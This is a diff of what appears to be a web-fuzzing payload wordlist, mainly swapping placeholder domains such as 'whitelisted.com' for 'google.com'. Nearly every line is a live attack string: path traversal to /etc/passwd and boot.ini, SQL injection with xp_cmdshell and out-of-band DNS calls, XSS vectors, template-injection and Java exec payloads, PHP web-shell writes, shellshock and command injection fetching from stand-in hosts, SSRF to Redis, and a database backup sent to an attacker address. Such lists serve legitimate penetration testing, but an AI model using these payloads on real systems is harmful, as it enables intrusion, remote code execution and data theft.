 ..%2f..%2f..%2f..%2f..%2f/etc/passwd%00index.html
-//3H6k7lIAiqjfNeN@whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
+//3H6k7lIAiqjfNeN@google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
 /..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cboot.ini
 ..%5c..%5c..%5c..%5c..%5c..%5cboot.ini;index.html
 ..%5c..%5c..%5c..%5c..%5c/etc/passwd%00index.html
@@ -7263,12 +7263,12 @@ echo "<?php include($_GET['page']); ?>" > rfi.php
 ' exec sp_addsrvrolemember 'name' , 'sysadmin' --
 http:3H6k7lIAiqjfNeN@00330.00072.0000326.00000316
 http://3H6k7lIAiqjfNeN@google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
-https:///whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
-/https://whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
-http:whitelisted.com@00330.00072.0000326.00000316
-http://www.whitelisteddomain.tld@00330.0x3a.54990
-http:www.whitelisteddomain.tld@0330.072.0326.0316
-http:www.whitelisteddomain.tld@[::216.58.214.206]
+https:///google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
+/https://google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
+http:google.com@00330.00072.0000326.00000316
+http://www.google.com@00330.0x3a.54990
+http:www.google.com@0330.072.0326.0316
+http:www.google.com@[::216.58.214.206]
 http:XY>.7d8T\205pZM@00330.00072.0000326.00000316
 http://XY>.7d8T\205pZM@google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
 "><input type='hidden' name='review_body' value="
@@ -7288,8 +7288,8 @@ OR exec master..xp_dirtree '//domain_collab/a'--
 ' UNION SELECT sum(columnname ) from tablename --
 /Volumes/Macintosh_HD1/opt/apache/conf/httpd.conf
 /Volumes/webBackup/opt/apache2/conf/httpd.conf%00
-//whitelisted.com+&@google.com#+@whitelisted.com/
-//XY>.7d8T\205pZM@whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
+//google.com+&@google.com#+@google.com/
+//XY>.7d8T\205pZM@google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
 /.//..//.//..//.//..//.//..//.//..//.//..//.//..//
 /.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\
 ..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f..0x2fboot.ini
@@ -7319,7 +7319,7 @@ OR exec master..xp_dirtree '//domain_collab/a'--
 ..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
 %%32%65%%32%65%%32%66%%32%65%%32%65%%32%66boot.ini
 %%32%65%%32%65%%35%63%%32%65%%32%65%%35%63boot.ini
-//3H6k7lIAiqjfNeN@whitelisted.com+@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
+//3H6k7lIAiqjfNeN@google.com+@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
 AND exec master..xp_dirtree '//domain_collab/a'-- 
 .//..//.//..//.//..//.//..//.//..//.//..//boot.ini
 ./\/././\/././\/././\/././\/././\/././\/./boot.ini
@@ -7352,15 +7352,15 @@ declare @s varchar (8000) select @s = 0x73656c ...
 ')) exec master..xp_dirtree '//domain_collab/a'-- 
 `)) exec master..xp_dirtree '//domain_collab/a'-- 
 http://3H6k7lIAiqjfNeN@google.com+@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
-http://3H6k7lIAiqjfNeN@whitelisted.com@google.com/
-http://google.com+&@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ#+@or.karmaz.pl/
+http://3H6k7lIAiqjfNeN@google.com@google.com/
+http://google.com+&@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ#+@or.domain_collab/
 https://%6c%6f%63%61%6c%64%6f%6d%61%69%6e%2e%70%77
-//https://whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
-/https:///whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
-https://www.whitelisteddomain.tld@google.com/%2f..
-http:www.whitelisteddomain.tld@0xd8.0x3a.0xd6.0xce
+//https://google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
+/https:///google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
+https://www.google.com@google.com/%2f..
+http:www.google.com@0xd8.0x3a.0xd6.0xce
 http://XY>.7d8T\205pZM@google.com+@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
-http://XY>.7d8T\205pZM@whitelisted.com@google.com/
+http://XY>.7d8T\205pZM@google.com@google.com/
 ?id=1 and substring(version(),1,1) between 3 and 4
 ../../../../../../../../../../../../localstart.asp
 " OR exec master..xp_dirtree '//domain_coolab/a'--
@@ -7380,8 +7380,8 @@ http://XY>.7d8T\205pZM@whitelisted.com@google.com/
 /Volumes/webBackup/private/etc/httpd/httpd.conf%00
 ; wget https://domain_collab/.testing/rce_vuln.txt
 /www.google.com/%2E%2E%2F%0D%0AHeader-Test:BLATRUC
-///www.whitelisteddomain.tld@www.google.com/%2e%2e
-//XY>.7d8T\205pZM@whitelisted.com+@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
+///www.google.com@www.google.com/%2e%2e
+//XY>.7d8T\205pZM@google.com+@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
 /..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f..0x2fboot.ini
 /..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5cboot.ini
 %252e%252e%252f%252e%252e%252fboot.ini%00index.html
@@ -7442,13 +7442,13 @@ C:/program files (x86)/xampp/apache/conf/httpd.conf
 ftp://0://srff2.domain_collab;http://google.com:80/
 ' grant connect to name; grant resource to name; --
 http://3H6k7lIAiqjfNeN@00330.00072.0000326.00000316
-http://3H6k7lIAiqjfNeN@whitelisted.com+@google.com/
-/https://www.whitelisteddomain.tld@google.com/%2f..
-http://whitelisted.com@00330.00072.0000326.00000316
-http://www.whitelisteddomain.tld@0330.072.0326.0316
-http://www.whitelisteddomain.tld@[::216.58.214.206]
+http://3H6k7lIAiqjfNeN@google.com+@google.com/
+/https://www.google.com@google.com/%2f..
+http://google.com@00330.00072.0000326.00000316
+http://www.google.com@0330.072.0326.0316
+http://www.google.com@[::216.58.214.206]
 http://XY>.7d8T\205pZM@00330.00072.0000326.00000316
-http://XY>.7d8T\205pZM@whitelisted.com+@google.com/
+http://XY>.7d8T\205pZM@google.com+@google.com/
 <img src onerror /" '"= alt=javascript:alert(1)//">
 `"'><img src=xxx:x \x00onerror=javascript:alert(1)>
 `"'><img src=xxx:x \x09onerror=javascript:alert(1)>
@@ -7461,7 +7461,7 @@ http://XY>.7d8T\205pZM@whitelisted.com+@google.com/
 `"'><img src=xxx:x \x27onerror=javascript:alert(1)>
 `"'><img src=xxx:x \x2Fonerror=javascript:alert(1)>
 jar://0://srff2.domain_collab;http://google.com:80/
-javascript://https://whitelisted.com/?z=%0Aalert(1)
+javascript://https://google.com/?z=%0Aalert(1)
 ogg://0://srff2.domain_collab;http://google.com:80/
 " OR exec master..xp_dirtree '//domain_collab/a'-- 
 ' OR exec master..xp_dirtree '//domain_collab/a'-- 
@@ -7487,7 +7487,7 @@ rar://0://srff2.domain_collab;http://google.com:80/
 /Volumes/Macintosh_HD1/usr/local/php/lib/php.ini%00
 && wget https://domain_collab/.testing/rce_vuln.txt
 //www.google.com/%2F%2E%2E%0D%0AHeader-Test:BLATRUC
-////www.whitelisteddomain.tld@www.google.com/%2e%2e
+////www.google.com@www.google.com/%2e%2e
 zip://0://srff2.domain_collab;http://google.com:80/
 ${"freemarker.template.utility.Execute"?new()("id")}
 \152\141\166\141\163\143\162\151\160\164\072alert(1)
@@ -7525,7 +7525,7 @@ dict://0://srff2.domain_collab;http://google.com:80/
 file://0://srff2.domain_collab;http://google.com:80/
 glob://0://srff2.domain_collab;http://google.com:80/
 http://0://srff2.domain_collab;http://google.com:80/
-http://www.whitelisteddomain.tld@0xd8.0x3a.0xd6.0xce
+http://www.google.com@0xd8.0x3a.0xd6.0xce
 ldap://0://srff2.domain_collab;http://google.com:80/
 Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
 Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
@@ -7566,8 +7566,8 @@ tftp://0://srff2.domain_collab;http://google.com:80/
 /Volumes/Macintosh_HD1/opt/apache/conf/httpd.conf%00
 /Volumes/Macintosh_HD1/usr/local/php4/httpd.conf.php
 /Volumes/Macintosh_HD1/usr/local/php5/httpd.conf.php
-//www.whitelisteddomain.tld@www.google.com/%2e%2e%2f
-//www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
+//www.google.com@www.google.com/%2e%2e%2f
+//www.google.com@www.google.com/%2f%2e%2e
 \x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(1)
 zlib://0://srff2.domain_collab;http://google.com:80/
 $(`wget https://domain_collab/.testing/rce_vuln.txt`)
@@ -7634,9 +7634,9 @@ t'exec master..xp_cmdshell 'nslookup domain_collab'--
 ../../../../../../../usr/local/apache/logs/error.l og
 ../../../../../../../usr/local/apache/logs/error_l og
 /Volumes/Macintosh_HD1/opt/apache2/conf/httpd.conf%00
-//whitelisted.com+&@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ#+@whitelisted.com/
-///www.whitelisteddomain.tld@www.google.com/%2e%2e%2f
-///www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
+//google.com+&@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ#+@google.com/
+///www.google.com@www.google.com/%2e%2e%2f
+///www.google.com@www.google.com/%2f%2e%2e
 /0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/boot.ini
 /0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\boot.ini
 %252e%252e/%252e%252e/%252e%252e/boot.ini%00index.html
@@ -7673,11 +7673,11 @@ C:/program files/mysql/mysql server 5.0/data/mysql.err
 C:/program files/mysql/mysql server 5.0/data/mysql.log
 expect://0://srff2.domain_collab;http://google.com:80/
 gopher://0://srff2.domain_collab;http://google.com:80/
-http://3H6k7lIAiqjfNeN@whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
-http://whitelisted.com+&@google.com#+@whitelisted.com/
-http:www.whitelisteddomain.tld@[::ffff:216.58.214.206]
-http://XY>.7d8T\205pZM@whitelisted.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
-javascript://www.whitelisteddomain.tld?%a0alert%281%29
+http://3H6k7lIAiqjfNeN@google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
+http://google.com+&@google.com#+@google.com/
+http:www.google.com@[::ffff:216.58.214.206]
+http://XY>.7d8T\205pZM@google.com@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
+javascript://www.google.com?%a0alert%281%29
 mailto://0://srff2.domain_collab;http://google.com:80/
 /Program Files\Apache Group\Apache2\conf\httpd.conf%00
 <SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
@@ -7686,8 +7686,8 @@ t'exec master..xp_cmdshell 'nslookup www.google.com'--
 ../../../../../../../usr/local/apache/logs/access. log
 ../../../../../../../usr/local/apache/logs/access_ log
 /Volumes/Macintosh_HD1/usr/local/php/httpd.conf.php%00
-////www.whitelisteddomain.tld@www.google.com/%2e%2e%2f
-////www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
+////www.google.com@www.google.com/%2e%2e%2f
+////www.google.com@www.google.com/%2f%2e%2e
 /0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/
 /0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\
 %252e%252e/%252e%252e/%252e%252e/%252e%252e//etc/passwd
@@ -7721,8 +7721,8 @@ C:/program files/xampp/apache/conf/httpd.confetc/passwd
 | echo "<?php system('dir $_GET['dir']')| ?>" > dir.php
 ../../../../../../../../../../../../../../../etc/passwd
 ../../../../../../../../../../../../../../etc/passwd%00
-http://3H6k7lIAiqjfNeN@whitelisted.com+@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
-http://XY>.7d8T\205pZM@whitelisted.com+@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
+http://3H6k7lIAiqjfNeN@google.com+@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
+http://XY>.7d8T\205pZM@google.com+@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
 <img src="x` `<script>javascript:alert(1)</script>"` `>
 " SELECT UTL_INADDR.get_host_address('domain_coolab')--
 ` SELECT UTL_INADDR.get_host_address('domain_coolab')--
@@ -7795,9 +7795,9 @@ dict://127.0.0.1:6379/CONFIG%20SET%20dir%20/var/www/html
 && echo "<?php system('dir $_GET['dir']'); ?>" > dir.php
 ; echo "<?php system('dir $_GET['dir']'); ?>" > dir.php 
 | echo "<?php system('dir $_GET['dir']')| ?>" > dir.php 
-https:///www.whitelisteddomain.tld@www.google.com/%2e%2e
-/https://www.whitelisteddomain.tld@www.google.com/%2e%2e
-http://www.whitelisteddomain.tld@[::ffff:216.58.214.206]
+https:///www.google.com@www.google.com/%2e%2e
+/https://www.google.com@www.google.com/%2e%2e
+http://www.google.com@[::ffff:216.58.214.206]
 ';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);
 Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
 Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
@@ -7883,7 +7883,7 @@ C:/windows/system32/inetsrv/config/applicationhost.config
 <!DOCTYPE xxe [<!ENTITY foo "aaaaaa">]><root>&foo;</root>
 && echo "<?php system('dir $_GET['dir']'); ?>" > dir.php 
 ;EXEC%20master..xp_dirtree%20'%5c%5cdomain_collab%5c'+--+
-https://www.whitelisteddomain.tld/https://www.google.com/
+https://www.google.com/https://www.google.com/
 <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
 javascript://%250Alert(document.location=document.cookie)
 OR copy (SELECT '') to program 'nslookup domain_coolab'--
@@ -7941,9 +7941,9 @@ C:/program files (x86)/apache group/apache/conf/httpd.conf
 dict://127.0.0.1:6379/CONFIG%20SET%20dbfilename%20file.php
 ../../../../../../../../../../../../../../../../etc/passwd
 ../../../../../../../../../../../../../../../etc/passwd%00
-https://www.whitelisteddomain.tld@www.google.com/%2e%2e%2f
-https://www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
-http://whitelisted.com+&@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ#+@whitelisted.com/
+https://www.google.com@www.google.com/%2e%2e%2f
+https://www.google.com@www.google.com/%2f%2e%2e
+http://google.com+&@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ#+@google.com/
 OR copy (SELECT '') to program 'nslookup domain_collab'-- 
 " OR SELECT UTL_INADDR.get_host_address('domain_coolab')--
 ' OR SELECT UTL_INADDR.get_host_address('domain_coolab')--
@@ -7953,7 +7953,7 @@ OR copy (SELECT '') to program 'nslookup domain_collab'--
 `)) SELECT UTL_INADDR.get_host_address('domain_collab')-- 
 system('curl https://domain_collab/.testing/rce_vuln.txt')
 /Volumes/webBackup/private/etc/httpd/httpd.conf.default%00
-//www.whitelisteddomain.tld@https:///www.google.com/%2e%2e
+//www.google.com@https:///www.google.com/%2e%2e
 ${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
 /0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2fetc/passwd
 0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f/etc/passwd
@@ -7997,9 +7997,9 @@ C:/windows/system32/inetsrv/config/schema/aspnet_schema.xml
 ./\/././\/././\/././\/././\/././\/././\/././\/.//etc/passwd
 .\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\/etc/passwd
 /..././..././..././..././..././..././..././..././etc/passwd
-https:///www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
-/https://www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
-http:www.whitelisteddomain.tld@00330.00072.0000326.00000316
+https:///www.google.com@www.google.com/%2f%2e%2e
+/https://www.google.com@www.google.com/%2f%2e%2e
+http:www.google.com@00330.00072.0000326.00000316
 &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
 &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
 " OR copy (SELECT '') to program 'nslookup domain_coolab'--
@@ -8042,8 +8042,8 @@ C:/program files (x86)/filezilla server/filezilla server.xml
 () { :;}; curl http://vps_ip/.testing/shellshock.txt?vuln=12
 .//..//.//..//.//..//.//..//.//..//.//..//.//..///etc/passwd
 .\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\/etc/passwd
-//https://www.whitelisteddomain.tld@www.google.com/%2e%2e%2f
-/https:///www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
+//https://www.google.com@www.google.com/%2e%2e%2f
+/https:///www.google.com@www.google.com/%2f%2e%2e
 Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
 Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
 " OR copy (SELECT '') to program 'nslookup domain_collab'-- 
@@ -8100,7 +8100,7 @@ Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
 /%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\boot.ini
 ../../../../../../../../../../../../../../../../../etc/passwd
 ../../../../../../../../../../../../../../../../etc/passwd%00
-http://www.whitelisteddomain.tld@00330.00072.0000326.00000316
+http://www.google.com@00330.00072.0000326.00000316
 ") OR copy (SELECT '') to program 'nslookup domain_collab'-- 
 ') OR copy (SELECT '') to program 'nslookup domain_collab'-- 
 `) OR copy (SELECT '') to program 'nslookup domain_collab'-- 
@@ -8335,7 +8335,7 @@ ABCD|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|
 C:\WINDOWS\win.ini../../../../../../../../../../../../etc/hosts%00
 data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=
 data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+Cg==
-/https://google.com@google.com/%2f.//or.karmaz.pl@google.com/%2f..
+/https://google.com@google.com/%2f.//or.domain_collab@google.com/%2f..
 "><meta http-equiv="refresh" content='0;URL=ftp://domain_collab?a=
 <title onpropertychange=javascript:alert(1)></title><title title=>
 /%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/
@@ -8410,7 +8410,7 @@ Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
 C:\Program Files\Apache Software Foundation\Apache2.2\conf\httpd.conf
 C:\Program Files\Apache Software Foundation\Apache2.2\logs\access.log
 ' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --
-%19Jav%09asc%09ript:https%20://whitelisted.com/%250Aconfirm%25281%2529
+%19Jav%09asc%09ript:https%20://google.com/%250Aconfirm%25281%2529
 ..%252f..%252f..%252f..%252f..%252f..%252f..%252fboot.ini%00index.html
 ..%255c..%255c..%255c..%255c..%255c..%255c..%255cboot.ini%00index.html
 %2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini%00index.html
@@ -8454,44 +8454,44 @@ C:\Program Files\Apache Software Foundation\Apache2.2\logs\access.log
 ..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66boot.ini
 ..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63boot.ini
 ..%5c..%5c..%5c..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\
-<a href="javascript\x00:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="javascript\x09:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="javascript\x0A:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="javascript\x0D:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="javascript\x3A:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x00javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x01javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x02javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x03javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x04javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x05javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x06javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x07javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x08javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x09javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x0Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x0Bjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x0Cjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x0Djavascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x0Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x0Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x10javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x11javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x12javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x13javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x14javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x15javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x16javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x17javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x18javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x19javascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x1Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x1Bjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x1Cjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x1Djavascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x1Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x1Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
-<a href="\x20javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript\x00:javascript:alert(1)" id="1">test</a>
+<a href="javascript\x09:javascript:alert(1)" id="1">test</a>
+<a href="javascript\x0A:javascript:alert(1)" id="1">test</a>
+<a href="javascript\x0D:javascript:alert(1)" id="1">test</a>
+<a href="javascript\x3A:javascript:alert(1)" id="1">test</a>
+<a href="\x00javascript:javascript:alert(1)" id="1">test</a>
+<a href="\x01javascript:javascript:alert(1)" id="1">test</a>
+<a href="\x02javascript:javascript:alert(1)" id="1">test</a>
+<a href="\x03javascript:javascript:alert(1)" id="1">test</a>
+<a href="\x04javascript:javascript:alert(1)" id="1">test</a>
+<a href="\x05javascript:javascript:alert(1)" id="1">test</a>
+<a href="\x06javascript:javascript:alert(1)" id="1">test</a>
+<a href="\x07javascript:javascript:alert(1)" id="1">test</a>
+<a href="\x08javascript:javascript:alert(1)" id="1">test</a>
+<a href="\x09javascript:javascript:alert(1)" id="1">test</a>
+<a href="\x0Ajavascript:javascript:alert(1)" id="1">test</a>
+<a href="\x0Bjavascript:javascript:alert(1)" id="1">test</a>
+<a href="\x0Cjavascript:javascript:alert(1)" id="1">test</a>
+<a href="\x0Djavascript:javascript:alert(1)" id="1">test</a>
+<a href="\x0Ejavascript:javascript:alert(1)" id="1">test</a>
+<a href="\x0Fjavascript:javascript:alert(1)" id="1">test</a>
+<a href="\x10javascript:javascript:alert(1)" id="1">test</a>
+<a href="\x11javascript:javascript:alert(1)" id="1">test</a>
+<a href="\x12javascript:javascript:alert(1)" id="1">test</a>
+<a href="\x13javascript:javascript:alert(1)" id="1">test</a>
+<a href="\x14javascript:javascript:alert(1)" id="1">test</a>
+<a href="\x15javascript:javascript:alert(1)" id="1">test</a>
+<a href="\x16javascript:javascript:alert(1)" id="1">test</a>
+<a href="\x17javascript:javascript:alert(1)" id="1">test</a>
+<a href="\x18javascript:javascript:alert(1)" id="1">test</a>
+<a href="\x19javascript:javascript:alert(1)" id="1">test</a>
+<a href="\x1Ajavascript:javascript:alert(1)" id="1">test</a>
+<a href="\x1Bjavascript:javascript:alert(1)" id="1">test</a>
+<a href="\x1Cjavascript:javascript:alert(1)" id="1">test</a>
+<a href="\x1Djavascript:javascript:alert(1)" id="1">test</a>
+<a href="\x1Ejavascript:javascript:alert(1)" id="1">test</a>
+<a href="\x1Fjavascript:javascript:alert(1)" id="1">test</a>
+<a href="\x20javascript:javascript:alert(1)" id="1">test</a>
 {"".getClass().forName("java.lang.Runtime").getMethods()[6].toString()}
 system('curl https://domain_collab/.testing/rce_vuln.txt?req=22fd2wdf')
 system('wget https://domain_collab/.testing/rce_vuln.txt?req=22fd2w23')
@@ -8586,7 +8586,7 @@ BACKUP database master to disks='\\<attackerip>\<attackerip>\backupdb.dat'
 /%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/boot.ini
 /%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\boot.ini
 ..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini
-/https://whitelisted.com@google.com/%2f.//whitelisted.com@google.com/%2f..
+/https://google.com@google.com/%2f.//google.com@google.com/%2f..
 \n\033[2curl http://vps_ip/.testing/term_escape.txt?vuln=1?user=\`whoami\`
 \n\033[2wget http://vps_ip/.testing/term_escape.txt?vuln=2?user=\`whoami\`
 \u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003aalert(1)
@@ -8606,7 +8606,7 @@ BACKUP database master to disks='\\<attackerip>\<attackerip>\backupdb.dat'
 ..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
 %5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69
 admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
-<a href="\xC2\xA0javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xC2\xA0javascript:javascript:alert(1)" id="1">test</a>
 ..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f/etc/passwd
 ..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c/etc/passwd
 ..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af/etc/passwd
@@ -8682,24 +8682,24 @@ Roses are [0;31mred[0m, violets are [0;34mblue. Hope you enjoy terminal hue
 %252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255cboot.ini;index.html
